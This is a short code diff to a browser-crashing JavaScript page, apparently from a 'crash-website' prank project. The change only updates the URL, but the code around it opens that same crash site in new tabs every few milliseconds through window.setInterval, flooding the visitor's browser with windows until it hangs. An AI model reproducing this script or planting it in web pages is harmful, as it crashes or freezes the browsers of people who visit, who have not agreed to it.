@@ -4,7 +4,7 @@
  // © Copyright 2022 CrazyH
 
 function spamWin() {
-    window.open("https://hucklehive.github.io/crash-website/", "_blank");
+    window.open("https://crazyh2.github.io/crash-website/", "_blank");
 }
 
 window.setInterval(spamWin, 0005);
